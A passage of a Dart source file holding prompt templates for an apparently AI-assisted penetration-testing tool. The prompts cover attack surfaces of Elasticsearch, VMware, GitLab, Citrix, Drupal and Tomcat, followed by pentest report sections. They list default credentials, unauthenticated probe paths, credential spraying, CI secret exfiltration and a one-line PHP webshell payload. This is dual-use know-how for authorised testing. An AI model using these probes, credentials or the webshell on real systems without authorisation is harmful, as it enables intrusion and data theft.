- Severity: CRITICAL when admin credentials are available

## RULES
- Only generate findings for surfaces confirmed present or logically derivable from confirmed Exchange detection
- SSRF/proxy class findings: MEDIUM confidence if version is not confirmed; HIGH if version falls in a known-vulnerable era
- All severity levels escalate one level when Exchange is directly internet-accessible
- Do not duplicate generic web findings (XSS, SQLi) — focus on Exchange-specific classes

''';

  /// Elasticsearch / Kibana attack surface analysis.
  /// Fire when _hasElasticsearchIndicators() returns true.
  static String elasticsearchDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in data infrastructure. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to Elasticsearch and Kibana.

## DEVICE DATA:
$deviceJson

## CONTEXT
Elasticsearch or Kibana has been identified on this target. Elasticsearch clusters are routinely found without authentication — the default configuration in older versions requires no credentials. The impact is usually immediate: sensitive index data is directly readable. Kibana adds an administrative UI and additional code execution surface.

## ATTACK SURFACE

### Unauthenticated Cluster Access and Data Exfiltration
Elasticsearch instances without authentication expose all stored index data without any exploitation required.
- Probe `/_cat/indices?v` — if it returns an index list without an authentication challenge, all data is directly accessible
- Probe `/_cluster/health` and `/_nodes` to assess cluster size and configuration
- An accessible index list means the attacker can then query any index: `GET /index_name/_search?size=100`
- The data stored is frequently sensitive: application logs (which contain session tokens, stack traces, internal URLs), user records, authentication events, payment data, health records
- Severity: CRITICAL when sensitive data is accessible without authentication; the finding is the data exposure itself, not a theoretical vulnerability

### Index Enumeration Strategy
Once index access is confirmed, reason about which indices are highest value:
- `logstash-*`, `filebeat-*`, `metricbeat-*` — application and infrastructure logs; may contain session tokens, error messages with credentials, internal API responses
- Indices named after application components (e.g., `users`, `orders`, `sessions`, `audit`) — direct application data records
- `.kibana` — Kibana configuration including saved searches, dashboards, and visualisations that reveal application architecture
- `.security` (when X-Pack is present) — user and role definitions; if readable, may reveal credential hashes
- Severity: CRITICAL for user data or credential-containing indices; HIGH for infrastructure logs

### Cluster Configuration and Credential Exposure
Even without sensitive business data, cluster configuration endpoints expose infrastructure details:
- `/_nodes` — all node hostnames, IP addresses, JVM paths, file system paths, cluster topology
- `/_cluster/settings` — cluster-wide settings including any keystore references and remote cluster configurations
- `/_cat/shards`, `/_cat/nodes` — node inventory and resource usage
- Severity: HIGH — enables further targeting of the infrastructure

### Snapshot Repository Path Traversal
The Elasticsearch snapshot API can be configured to write snapshots to filesystem paths. If the repository path parameter is controllable by an attacker with API access:
- Setting the repository path to `/` or system paths may allow reading arbitrary files from the Elasticsearch server filesystem via the snapshot restoration API
- Evidence: snapshot API accessible (`/_snapshot/`); API access confirmed
- Severity: HIGH when snapshot API is accessible

### Kibana Script Execution (Canvas / Vega / Timelion)
Kibana visualisation features include scripting capabilities that have historically allowed server-side code execution:
- Kibana Canvas: executes SQL and Expression language that makes server-side requests
- Kibana Vega: accepts Vega-Lite JSON specifications that can include `url` data sources fetching from arbitrary URLs (SSRF vector to internal services)
- Timelion (older Kibana): had server-side script execution vulnerability classes in some version ranges
- Identify the Kibana version from the login page, response headers, or the Kibana API (`/api/status`)
- Reason about which vulnerability class era applies to the detected version
- Severity: HIGH for SSRF via Vega; CRITICAL for RCE in affected Timelion versions

### X-Pack Security Misconfiguration
When X-Pack is present but appears misconfigured:
- Elasticsearch with X-Pack enforced returns HTTP 401 or a security exception JSON on unauthenticated requests
- If specific API paths return data despite X-Pack being enabled, document the specific inconsistency
- Common misconfiguration: X-Pack enabled on the main cluster but not on monitoring/coordination nodes
- Severity: HIGH when authentication is inconsistently enforced

## RULES
- The primary and most common finding is unauthenticated access — probe this first and prioritise it
- Confidence: HIGH when `/_cat/indices` or `/_cluster/health` responds without authentication; MEDIUM when port is confirmed but endpoint not yet probed
- Document specific index names observed in recon data as evidence where present

''';

  /// VMware vCenter / ESXi attack surface analysis.
  /// Fire when _hasVmwareIndicators() returns true.
  static String vmwareDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in virtualisation infrastructure. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to VMware vCenter Server and ESXi.

## DEVICE DATA:
$deviceJson

## CONTEXT
VMware vCenter or ESXi has been identified on this target. VMware virtualisation management infrastructure is the highest-value target in most enterprise environments: full control of vCenter means control of every VM and workload running on managed hosts. vCenter typically runs on the management network but is commonly accessible via HTTPS on port 443. ESXi management interfaces are frequently accessible on port 443 and 902.

## ATTACK SURFACE

### Authentication Bypass Vulnerability Class (vCenter Management Endpoints)
vCenter has a recurring pattern of authentication bypass vulnerabilities affecting management API endpoints and the vSphere Client web interface. These vulnerabilities allow access to privileged management operations without valid credentials.
- Common attack surfaces: `/vcenter-sdk/`, `/ui/`, `/vsphere-client/`, `/rest/` (vSphere REST API), `/sdk/`
- Identify the vCenter version from response headers, the login page version string, or the `/rest/com/vmware/cis/session` endpoint
- Reason about whether the detected version falls in a known-vulnerable era for this class without referencing specific CVE IDs
- Severity: CRITICAL — unauthenticated access to virtualisation management

### vCenter SSRF via Management Plugins and APIs
vCenter and its integrated components (vRealize Operations, vSAN management, HCX) have had SSRF vulnerability classes where HTTP requests to internal vCenter services can be triggered from externally-accessible endpoints.
- Attack surface: plugin API endpoints, the Virtual Infrastructure JSON API, and management portal redirectors
- SSRF from vCenter reaches internal vCenter services not directly accessible, including the vSphere Automation API, vCenter Single Sign-On, and internal health check endpoints
- Severity: CRITICAL — SSRF within a vCenter context may chain into authentication material or RCE

### ESXi Management Interface Direct Exposure
ESXi hosts expose a management web interface and API that should only be accessible from a management VLAN.
- Port 443: ESXi web interface and vSphere API (`/ui/`, `/sdk/`)
- Port 902: VMware proprietary management protocol used by vSphere clients and vCenter to communicate with ESXi
- Default credentials on unmanaged or newly deployed ESXi hosts: `root` with empty password or `root`/`vmware`
- Severity: CRITICAL when management interface is accessible from untrusted networks

### Managed Object Browser (MOB) Exposure (`/mob/`)
The vSphere Managed Object Browser is a debugging interface that should be disabled in production but is sometimes left enabled. It provides interactive access to the full vSphere API surface.
- HTTP 200 on `/mob/` without authentication redirect confirms the MOB is enabled and accessible
- The MOB allows browsing and invoking vSphere API methods interactively, including methods that manipulate VMs, datastores, and network configuration
- Severity: HIGH when accessible — direct interactive API access without requiring SDK knowledge

### Arbitrary File Upload/Read Vulnerability Classes
vCenter Appliance (VCSA) has had vulnerability classes involving:
- Arbitrary file upload to the VCSA filesystem via management API endpoints, combined with a path to execute the uploaded file (achieving RCE)
- Arbitrary file read via path traversal in management request handlers — commonly targeting `/etc/passwd`, vCenter configuration files containing credentials, and SSO configuration
- Reason about the version era and whether these classes apply to the detected version
- Severity: CRITICAL for file upload + execution; HIGH for arbitrary file read

### Credential Store and Linked Infrastructure
vCenter's credential store holds service account credentials for all managed ESXi hosts, linked vCenter instances, and integrated services. Compromising vCenter yields:
- Credentials for every managed ESXi host
- SSO service account credentials (used across all vSphere components)
- Integration credentials for NSX, vSAN, HCX, and other VMware products
- Evidence: any authenticated vCenter access
- Severity: CRITICAL — complete virtualisation infrastructure compromise

### Post-Authentication VM Control
Authenticated vCenter access allows:
- Taking VM snapshots and mounting VMDK files — direct filesystem access to every guest VM without going through the guest OS
- Modifying VM configurations including boot order (boot from ISO containing an attacker OS) and network connectivity
- Accessing VM console sessions directly
- Severity: CRITICAL when authenticated access is achieved

## RULES
- Only generate findings for surfaces confirmed present or derivable from confirmed VMware detection
- Authentication bypass class: MEDIUM confidence if version is unconfirmed; HIGH if version falls in a known-vulnerable era
- All findings escalate one severity level when management interfaces are internet-accessible
- Generate separate findings for vCenter and ESXi when both are present

''';

  /// GitLab attack surface analysis.
  /// Fire when _hasGitLabIndicators() returns true.
  static String gitLabDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in developer infrastructure. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to GitLab.

## DEVICE DATA:
$deviceJson

## CONTEXT
GitLab has been identified on this target. Self-hosted GitLab instances are high-value targets: they contain source code for all applications in the organisation, hold CI/CD secrets (API keys, cloud credentials, signing keys), and frequently have misconfigured access controls due to an assumption of internal-only access.

## ATTACK SURFACE

### Unauthenticated Repository and User Enumeration
GitLab instances that permit public project visibility or open registration expose source code and developer information without authentication.
- Probe `/api/v4/projects?visibility=public` — returns all publicly visible projects including repository URLs
- Probe `/api/v4/users` — enumerates all registered users (username, display name, email in some configurations)
- Even private instances may expose project names and member lists via the explore page (`/explore/projects`)
- Severity: HIGH when source code is accessible; MEDIUM for user enumeration

### CI/CD Pipeline Secret Exposure
GitLab CI/CD variables (Settings → CI/CD → Variables) store secrets used during pipeline execution. These secrets are accessible to pipeline jobs and may leak into build logs.
- Any user with Developer or Maintainer access to a repository can view pipeline logs
- Misconfigured pipelines that print environment variables (`env`, `printenv`) expose all CI/CD secrets in plaintext in the log
- CI/CD variables marked "protected" are only available on protected branches — but "masked" variables can still be extracted by a job that writes them to a file
- Severity: CRITICAL when secrets include cloud provider credentials, API keys, or signing keys — scope is every system the pipeline deploys to

### CI Pipeline Code Execution
Any user who can push to a branch and trigger a pipeline can execute arbitrary code in the GitLab Runner environment via `.gitlab-ci.yml` modifications.
- GitLab Runners executing pipelines often have access to internal networks, Kubernetes clusters, and production credentials that are not accessible from the internet
- A malicious `.gitlab-ci.yml` can exfiltrate all CI/CD variables, make requests to internal services, and modify deployment artefacts
- Fork pipelines may execute in the context of the parent repository's Runner with access to the parent's secrets (misconfiguration)
- Severity: CRITICAL when Runners have privileged network access

### GraphQL API Authorization Flaws
GitLab's GraphQL API (`/api/graphql`) has had authorization inconsistencies where non-admin users could query sensitive data that was more restricted in the REST API.
- Test: query `{ currentUser { id name email } }` — confirms authentication state
- Test: query project membership, repository data, and merge request content for projects the user should not access
- Test: query CI/CD variable names (note: values are not returned, but names reveal what credentials are in use)
- Severity: MEDIUM to HIGH depending on data accessible

### SSRF via Import and Integration Features
GitLab project import, webhook configuration, and service integrations accept user-controlled URLs and make server-side HTTP requests.
- Project import from URL: GitLab fetches the repository from the specified URL — SSRF to internal services
- Webhooks: any project maintainer can configure a webhook pointing to any URL; GitLab sends HTTP POST requests on events
- Service integrations (Jira, Slack, custom): similar server-side request capability
- Severity: HIGH — SSRF to internal services including cloud metadata endpoint (169.254.169.254) if GitLab is cloud-hosted

### Version-Era Vulnerability Classes
Identify the GitLab version from the login page HTML, `/-/help`, `/api/v4/version` (if accessible), or response headers. Reason about applicable vulnerability classes:
- Older GitLab versions had critical RCE via ExifTool processing of uploaded image files — any authenticated user who could upload an image could achieve RCE on the GitLab server
- GitLab has had path traversal vulnerability classes affecting the repository file serving, and SSRF classes in the import pipeline
- Do not reference specific CVE IDs — describe the vulnerability class and version era

### Secret Exposure in Repository Content
Repository content itself is a high-value target for credential harvesting:
- Search for hardcoded secrets in committed files: API keys, database connection strings, private keys, cloud credentials
- Check for sensitive files: `.env`, `*.pem`, `*.key`, `config/database.yml`, `config/secrets.yml`, `credentials.json`
- Check commit history — secrets removed from the current HEAD may still be present in git history
- Severity: CRITICAL when cloud credentials or private keys are found; HIGH for API keys and database passwords

## RULES
- Only generate findings for surfaces confirmed present or derivable from confirmed GitLab detection
- Confidence: HIGH when GitLab-specific path/header confirmed + endpoint accessible; MEDIUM when GitLab confirmed but endpoint not probed
- Severity escalates one level when GitLab is internet-accessible
- Keep CI/CD secret and repository secret findings as separate entries

''';

  /// Citrix ADC / NetScaler attack surface analysis.
  /// Fire when _hasCitrixIndicators() returns true.
  static String citrixDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in remote access infrastructure. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to Citrix ADC (NetScaler) and Citrix Gateway.

## DEVICE DATA:
$deviceJson

## CONTEXT
Citrix ADC (formerly NetScaler) or Citrix Gateway has been identified on this target. The Citrix gateway is the remote access entry point for the enterprise network — compromising it yields network-level internal access without requiring individual service credentials. Citrix ADC has had multiple critical vulnerability classes in recent years, several of which were actively exploited at scale.

## ATTACK SURFACE

### Path Traversal Vulnerability Class (VPN Endpoint)
Citrix ADC has had a class of critical path traversal vulnerabilities affecting the VPN endpoint and management interfaces. Specially crafted URL paths bypass authentication and allow reading arbitrary files from the appliance filesystem.
- Commonly targeted files: `/nsconfig/ns.conf` (contains all appliance configuration including LDAP bind credentials and shared secrets), `/etc/passwd`, SSL private keys
- This vulnerability class has been one of the most widely exploited in enterprise VPN infrastructure
- Attack surface: the VPN endpoint paths (`/vpn/`, `/citrix/`, `/nf/`)
- Identify the Citrix ADC version from response headers or the login page and reason about version era without specific CVE IDs
- Severity: CRITICAL when path traversal allows reading configuration files containing credentials

### Authentication Bypass (Management Interface)
Citrix ADC's management API (`/nitro/v1/config/`, `/nitro/v1/stat/`) and NSIP management interface have had authentication bypass vulnerability classes where specific request patterns or header values bypass authentication checks.
- An unauthenticated management API bypass allows reading and modifying ADC configuration: adding admin accounts, modifying load balancing rules, extracting LDAP integration credentials
- Test key management endpoints directly without authentication: `GET /nitro/v1/config/nsip`
- Severity: CRITICAL when management API is accessible without authentication

### VPN Credential Spray (`/vpn/index.html`, `/logon/LogonPoint/`)
The Citrix Gateway authenticates users against Active Directory or RADIUS. Without multi-factor authentication, the endpoint accepts unlimited authentication attempts.
- Successful authentication provides VPN-level access to the internal corporate network — equivalent to being physically on-site
- Spray against the authentication endpoint using organisation-specific password patterns
- Evidence: VPN login page accessible
- Severity: CRITICAL when successful — internal network access

### NSIP Management Interface Direct Exposure
The Citrix NSIP (management IP) interface should only be accessible from the management VLAN. When port 80/443 with Citrix management paths is accessible from external or untrusted networks, the full management API surface is exposed.
- Management interface provides: appliance configuration read/write, admin credential management, load balancer rule modification, SSL certificate management
- Evidence: Citrix management paths accessible from the testing network
- Severity: CRITICAL when accessible from untrusted networks

### ICA Session Protocol Exposure (Ports 1494 / 2598)
Citrix ICA sessions (ports 1494 and 2598) carry full remote desktop traffic between clients and published applications.
- Direct port accessibility means the ICA protocol is reachable without going through the Citrix Gateway — bypassing gateway-level authentication and logging
- Older ICA protocol versions without strong encryption expose session content
- Evidence: ports 1494 or 2598 open
- Severity: HIGH when ICA ports are directly accessible from untrusted networks

### SAML SSO Integration Misconfiguration
When Citrix Gateway is integrated with a SAML identity provider for SSO, SAML signature validation weaknesses allow authentication bypass.
- XML Signature Wrapping (XSW): valid SAML assertion is moved inside the signature envelope while a malicious assertion replaces it — if the application validates the signature but authenticates using the unsigned assertion, arbitrary identity can be assumed
- Evidence: SAML authentication flow visible on the Citrix login page (redirect to IdP, SAML parameters in login flow)
- Severity: CRITICAL — complete authentication bypass

### Post-Authentication Internal Network Access
Once authenticated to the Citrix Gateway:
- Document all internal network segments and services accessible via the VPN connection
- Test for split tunnelling misconfiguration that routes all traffic through the corporate network
- The primary value of Citrix Gateway access is reaching internal services not otherwise exposed — document this as an attack path rather than a standalone finding
- Severity: CRITICAL for access to critical internal infrastructure; scope depends on network segmentation

## RULES
- Only generate findings for surfaces confirmed present or derivable from confirmed Citrix detection
- Path traversal class: MEDIUM confidence if version is unconfirmed; HIGH if version falls in a known-vulnerable era
- Severity escalates one level for internet-accessible instances (external scope)

''';

  /// Drupal attack surface analysis.
  /// Fire when _hasDrupalIndicators() returns true.
  static String drupalDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in CMS platforms. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to Drupal.

## DEVICE DATA:
$deviceJson

## CONTEXT
Drupal has been identified on this target. Drupal has had several "Drupalgeddon"-class vulnerabilities — unauthenticated RCE via core functionality — that remain unpatched on many production sites. Its module ecosystem mirrors WordPress's plugin ecosystem in CVE richness. The generic web prompts cover injection and authentication classes generally; this prompt covers what is unique to Drupal's architecture.

## ATTACK SURFACE

### Form API / Render Array Injection Vulnerability Class ("Drupalgeddon" Class)
Drupal's Form API processes render arrays that describe form structure and behaviour. A recurring class of critical vulnerabilities exists where attacker-controlled input reaches the render pipeline and is processed as render array properties, causing PHP code execution.
- This class has affected multiple major Drupal versions and is among the most well-known CMS RCE patterns
- Attack surface: any Drupal form endpoint that processes user input, particularly the login form, search, comment, and registration forms
- Identify the Drupal major version from `X-Generator` header, `CHANGELOG.txt`, `/INSTALL.txt`, or the login page
- Reason about whether the detected version falls in a known-vulnerable era for this class without referencing specific CVE IDs
- Severity: CRITICAL when version is potentially affected

### PHP Filter Module / Text Format RCE
The PHP filter module (available in Drupal 7 and earlier by default, removed from Drupal 8+) allows users with the "use PHP for settings" or "PHP code" text format permission to embed and execute PHP code in content.
- If enabled, any user with the relevant text format permission can create a node containing `<?php system(\$_GET["cmd"]); ?>` and execute OS commands
- In Drupal 8+, custom text format filters may have similar effects depending on configuration
- Evidence: PHP filter module present (`/admin/modules` if accessible), or text format configuration visible
- Severity: CRITICAL when module is enabled and any user account is obtainable

### REST and JSON:API Data Exposure (Drupal 8+)
Drupal 8 and later include REST (`/rest/`) and JSON:API (`/jsonapi/`) modules that expose entity data. When enabled without strict access controls:
- `/jsonapi/node/article` — returns all published article nodes including body content and metadata
- `/jsonapi/user/user` — enumerates all user accounts including usernames and email addresses
- `/rest/session/token` — returns a session token for CSRF operations (not a vulnerability alone, but useful for CSRF attacks on REST endpoints)
- Severity: HIGH when user enumeration is possible; MEDIUM for content enumeration

### `update.php` and `install.php` Exposure
These Drupal maintenance scripts should be inaccessible after installation but are sometimes left enabled.
- `/update.php` — runs database schema updates; if accessible without authentication, may allow modification of Drupal's internal configuration tables
- `/install.php` — re-runs the installation process; access could allow overwriting Drupal configuration
- Evidence: HTTP 200 on these paths (403 with a Drupal error page also indicates the file exists)
- Severity: HIGH when accessible

### Node Access Bypass and Content Enumeration
Drupal's node access system controls which users can view which content. Historical vulnerability classes have allowed bypassing these controls by manipulating node IDs or access parameters.
- Test direct node access: `/node/N` for incrementing values of N — does restricted content appear?
- Test view access with modified query parameters on listing pages
- Severity: MEDIUM to HIGH depending on sensitivity of inaccessible content

### Admin Interface Paths
Drupal admin paths provide full CMS control when authenticated as an administrator:
- `/admin/config` — site-wide configuration
- `/admin/structure` — content type and taxonomy management
- `/admin/people` — user management (create admin accounts, reset passwords)
- `/admin/modules` — enable/disable modules including PHP filter
- Any authenticated admin access yields PHP RCE via module enabling + PHP filter
- Severity: CRITICAL for admin access leading to PHP filter enable

### Module Version-Era Vulnerability Reasoning
Identify installed modules from path enumeration (module CSS/JS paths like `/modules/MODULE_NAME/`) or admin pages. Reason about vulnerability classes by module type:
- Webform module: SQL injection in submission processing, arbitrary file upload via file field
- Views module: SQL injection in exposed filter inputs (older versions)
- CKEditor / text editor integration: stored XSS via HTML sanitisation bypass
- Media module: arbitrary file upload leading to webshell
- Commerce module: order manipulation, price tampering
- Do not reference specific CVE IDs — reason by module type and vulnerability class

## RULES
- Only generate findings for surfaces confirmed present or derivable from confirmed Drupal detection
- Drupalgeddon class: MEDIUM confidence if version is unconfirmed; HIGH if version is in a known-vulnerable era and endpoint is accessible
- Do not duplicate generic web findings (XSS, CORS, JWT) — focus on Drupal-specific surfaces

''';

  /// Apache Tomcat attack surface analysis.
  /// Fire when _hasApacheTomcatIndicators() returns true.
  static String apacheTomcatDeepDivePrompt(String deviceJson) => '''
You are an expert penetration tester specialising in Java application servers. Analyze the device data below and identify EXPLOITABLE vulnerabilities specific to Apache Tomcat.

## DEVICE DATA:
$deviceJson

## CONTEXT
Apache Tomcat has been identified on this target. Tomcat is the most widely deployed Java application server. Its Manager application provides direct WAR deployment = direct code execution when accessible. The AJP connector has its own critical vulnerability class. Both are routinely found misconfigured.

## ATTACK SURFACE

### Manager Application Default/Weak Credentials (`/manager/html`)
The Tomcat Manager application deploys, undeploys, and restarts web applications via a web interface protected by HTTP Basic authentication.
- The Manager endpoint returns HTTP 401 or 403 when it exists — both responses confirm the endpoint is present
- Default credentials: `tomcat:tomcat`, `admin:admin`, `admin:`, `manager:manager`, `tomcat:s3cret`, `admin:tomcat`
- Successful authentication provides WAR file upload → deploy a JSP webshell → OS-level RCE as the Tomcat process user
- Also test the text-interface endpoint `/manager/text/deploy` — same credentials, same capability, used by automation tools
- Severity: CRITICAL when endpoint is accessible

### AJP Connector Exposure (Ghostcat Vulnerability Class)
The AJP protocol connector (default port 8009) handles communication between a web frontend and Tomcat. When directly exposed to untrusted networks without authentication, AJP allows:
- Reading any file within the Tomcat web application directories, including `WEB-INF/web.xml` (configuration with database credentials), `WEB-INF/classes/` (compiled application code)
- In certain Tomcat version ranges, processing attacker-controlled file content as a JSP page (unauthenticated RCE via file inclusion)
- Evidence: port 8009 accessible from the testing network
- Severity: CRITICAL when port 8009 is open — read arbitrary webapp files; RCE if version is in the affected range

### HTTP PUT Method File Upload
Some Tomcat configurations enable the HTTP PUT verb on the DefaultServlet, allowing arbitrary file uploads to the web application directory.
- If `readonly` is set to `false` in the DefaultServlet configuration, PUT requests are accepted
- Upload a `.jsp` file to a web-accessible path → access the JSP URL → RCE
- Evidence: any HTTP 201 or 204 response to a PUT probe; DefaultServlet configuration visible
- Severity: CRITICAL when enabled

### Example Applications (`/examples/`)
Tomcat ships with example applications demonstrating session management, servlets, and JSP features. These are frequently left deployed in production.
- `/examples/servlets/servlet/SessionExample` — manipulates session data, useful for testing session handling
- `/examples/jsp/snp/snoop.jsp` — displays all request headers, server environment variables, and session data
- Evidence: HTTP 200 on `/examples/` paths
- Severity: MEDIUM (information disclosure; session snoop may expose sensitive data)

### Host Manager Application (`/host-manager/`)
The Host Manager allows adding and removing virtual hosts on the Tomcat instance. It uses the same credential store as the Manager application.
- Adding a virtual host is less direct than WAR deployment but provides a path to further access
- Test for presence with the same credential approach as `/manager/html`
- Severity: MEDIUM (administrative capability, requires same credentials as Manager)

### Java Deserialization via Connectors
Tomcat's HTTP and AJP connectors process serialized Java objects in session data and specific request types.
- Identify the Tomcat version from response headers (`Server: Apache-Coyote/1.1/X.Y.Z`, login page, or Manager status page)
- Reason about whether the detected version falls in a vulnerable era for Java deserialization via the connector — older versions before the remoting hardening are more likely affected
- Do not reference specific CVE IDs — describe the vulnerability class and version era
- Severity: CRITICAL if version is in a known-vulnerable era

## RULES
- Only generate findings for surfaces confirmed present or logically derivable from confirmed Tomcat detection
- Manager/AJP findings at MEDIUM confidence when endpoint existence is unconfirmed; HIGH when endpoint responds (even with 401/403/error)
- Do not duplicate generic web application findings (SQLi, XSS, etc.) — those are covered by the web prompts

''';

  // ---------------------------------------------------------------------------
  // Report narrative prompts (Phase 23)
  // ---------------------------------------------------------------------------

  /// Generate a professional executive summary for the pentest report.
  /// Returns plain prose — no JSON, no markdown fences, no headings.
  static String reportExecutiveSummaryPrompt({
    required String projectName,
    required int targetCount,
    required int criticalCount,
    required int highCount,
    required int mediumCount,
    required int lowCount,
    required int confirmedCount,
    required int totalVulnCount,
    required String? startDate,
    required String? endDate,
    required List<String> targetAddresses,
    required List<String> topFindingSummaries,
  }) {
    final dateRange = (startDate != null && endDate != null)
        ? 'conducted between $startDate and $endDate'
        : startDate != null
            ? 'initiated on $startDate'
            : 'recently conducted';
    final targetsLine = targetAddresses.isNotEmpty
        ? targetAddresses.join(', ')
        : '$targetCount target(s)';
    final topFindings = topFindingSummaries.isNotEmpty
        ? '\n\nTop findings by severity:\n${topFindingSummaries.map((f) => '- $f').join('\n')}'
        : '';
    return '''You are a senior penetration testing consultant writing a formal pentest report for a client.

Write a professional Executive Summary section for the following engagement. This section will be read by C-level executives and non-technical stakeholders, so it must be clear, business-focused, and free of raw technical jargon.

ENGAGEMENT DETAILS:
- Project: $projectName
- Assessment period: $dateRange
- Targets assessed: $targetsLine
- Total vulnerabilities identified: $totalVulnCount
  - Critical: $criticalCount
  - High: $highCount
  - Medium: $mediumCount
  - Low: $lowCount
- Confirmed (actively exploited/verified): $confirmedCount$topFindings

REQUIREMENTS:
- Write 2 to 4 paragraphs of plain prose
- Paragraph 1: briefly state what was assessed, when, and the overall objective
- Paragraph 2: characterise the overall security posture — interpret the numbers, do not just list them; explain what Critical/High counts mean for the business
- Paragraph 3 (if warranted): highlight the 2–3 most significant findings at a business risk level (no CVE IDs, no raw technical commands)
- Final paragraph: concise prioritisation recommendation — what must be fixed first and why
- Tone: professional, factual, measured — not alarmist, not dismissive
- Do NOT include section headings, bullet points, markdown syntax, or JSON
- Output plain paragraphs only, separated by blank lines''';
  }

  /// Generate a professional methodology and scope section for the pentest report.
  /// Returns plain prose — no JSON, no markdown fences, no headings.
  static String reportMethodologyPrompt({
    required String projectName,
    required List<String> targetAddresses,
    required bool hasInternalTargets,
    required bool hasExternalTargets,
    required bool hasWebTargets,
    required bool hasAdTargets,
    required int targetCount,
    required String? startDate,
    required String? endDate,
  }) {
    final scopeType = hasInternalTargets && hasExternalTargets
        ? 'a mixed internal and external environment'
        : hasExternalTargets
            ? 'an external (internet-facing) environment'
            : 'an internal network environment';
    final testingAreas = [
      if (hasWebTargets) 'web application security',
      if (hasAdTargets) 'Active Directory and authentication infrastructure',
      'network services and protocol-level testing',
      'vulnerability identification and active exploitation verification',
    ].join(', ');
    final dateRange = (startDate != null && endDate != null)
        ? 'between $startDate and $endDate'
        : startDate != null
            ? 'starting $startDate'
            : 'during the defined assessment window';
    final targetList = targetAddresses.isNotEmpty
        ? targetAddresses.join(', ')
        : '$targetCount system(s)';
    return '''You are a senior penetration testing consultant writing a formal pentest report.

Write a professional Methodology and Scope section for the following engagement.

ENGAGEMENT DETAILS:
- Project: $projectName
- Assessment period: $dateRange
- Environment type: $scopeType
- Targets in scope: $targetList
- Testing areas: $testingAreas

REQUIREMENTS:
- Write 2 to 3 paragraphs of plain prose
- Paragraph 1: state the scope — list the systems assessed, classify the environment (internal/external/mixed), and describe what categories of testing were included
- Paragraph 2: describe the testing methodology — automated vulnerability analysis followed by active exploitation verification to confirm or rule out each finding; AI-assisted analysis was used to generate findings, with each finding requiring command-level evidence before confirmation
- Paragraph 3: state what was explicitly out of scope (social engineering, physical access, denial of service attacks against production services) and any agreed limitations
- Do NOT list specific tool names by brand
- Do NOT include section headings, bullet points, markdown syntax, or JSON
- Output plain paragraphs only, separated by blank lines''';
  }

  /// Generate a professional risk rating model explanation for the pentest report.
  /// Returns plain prose — no JSON, no markdown fences, no headings.
  static String reportRiskRatingPrompt({
    required int criticalCount,
    required int highCount,
    required int mediumCount,
    required int lowCount,
    required bool hasCvssScores,
  }) {
    final cvssNote = hasCvssScores
        ? 'Findings in this report include CVSS v3.1 vector scores where applicable.'
        : '';
    return '''You are a senior penetration testing consultant writing a formal pentest report.

Write a professional Risk Rating Model section that explains how vulnerabilities are classified in this report.

CONTEXT:
- Severity distribution in this report: Critical: $criticalCount, High: $highCount, Medium: $mediumCount, Low: $lowCount
- $cvssNote

REQUIREMENTS:
- Write 1 to 2 paragraphs of plain prose
- Explain the four severity levels (Critical, High, Medium, Low) and what each means in terms of exploitability and potential business impact
- ${hasCvssScores ? 'Note that findings are scored using CVSS v3.1 and briefly explain what the Attack Vector, Complexity, and Impact components represent in plain language' : 'Note that severity is assessed based on exploitability, potential impact, and context'}
- Explain the three finding statuses used: Confirmed (actively verified via exploitation), Undetermined (inconclusive or target unreachable), and Not Vulnerable (conclusively ruled out)
- Explain that Confirmed findings represent the highest remediation priority
- Tone: clear and factual, written for a technical reader but accessible to a security-aware manager
- Do NOT include section headings, bullet points, markdown syntax, or JSON
- Output plain paragraphs only, separated by blank lines''';
  }

  /// Generate a professional conclusion section for the pentest report.
  /// Returns plain prose — no JSON, no markdown fences, no headings.
  static String reportConclusionPrompt({
    required String projectName,
    required int totalVulnCount,
    required int confirmedCount,
    required int criticalCount,
    required int highCount,
    required List<String> topFindingSummaries,
    required String? endDate,
  }) {
    final topFindings = topFindingSummaries.isNotEmpty
        ? '\n\nHighest priority findings:\n${topFindingSummaries.map((f) => '- $f').join('\n')}'
        : '';
    final asOf = endDate != null ? 'as of $endDate' : 'at the time of assessment';
    return '''You are a senior penetration testing consultant writing the final section of a formal pentest report.

Write a professional Conclusion section for the following engagement.

ENGAGEMENT DETAILS:
- Project: $projectName
- Total vulnerabilities identified: $totalVulnCount (Critical: $criticalCount, High: $highCount)
- Confirmed (actively exploited/verified): $confirmedCount
- Assessment complete $asOf$topFindings

REQUIREMENTS:
- Write 2 to 3 paragraphs of plain prose
- Paragraph 1: summarise the overall outcome — what the assessment revealed about the security posture of the environment; be honest but constructive
- Paragraph 2: identify the highest-priority remediation items by name and severity from the list above (use the finding names exactly as provided — do not invent new names); frame them in terms of business risk and urgency
- Final paragraph: close professionally — recommend a remediation timeline, suggest a re-test after remediation, and offer a brief forward-looking statement about continuous security improvement
- Tone: constructive, professional, and action-oriented — leave the reader knowing what to do next
- Do NOT include section headings, bullet points, markdown syntax, or JSON
- Output plain paragraphs only, separated by blank lines''';
  }

  /// Phase 7: Attack narrative generation.
  /// Produces a prose attack-path story from initial access to impact —
  /// the section clients actually read in the final report.
  static String attackNarrativePrompt({
    required List<Vulnerability> confirmedFindings,
    required String targetContext,
  }) {
    final findingLines = confirmedFindings
        .take(15)
        .map((v) => '  - [${v.severity}] ${v.problem} on ${v.targetAddress}: ${v.evidence.length > 150 ? v.evidence.substring(0, 150) : v.evidence}')
        .join('\n');
    return '''You are a senior penetration tester writing the attack narrative section of a formal pentest report. This section tells the story of how an attacker could move from initial access to full compromise — it is the most-read technical section of the report.

## ENGAGEMENT CONTEXT:
$targetContext

## CONFIRMED FINDINGS (the building blocks of your narrative):
$findingLines

## YOUR TASK:
Write a structured attack narrative in 4 sections. Each section is 1–3 paragraphs of plain prose — no bullet points, no markdown, no JSON, no headings with # symbols.

### SECTION 1 — Initial Access
Describe how an attacker gains the first foothold in the environment. Reference the specific confirmed finding(s) that enable this. Explain what the attacker can do immediately after gaining this foothold.

### SECTION 2 — Lateral Movement
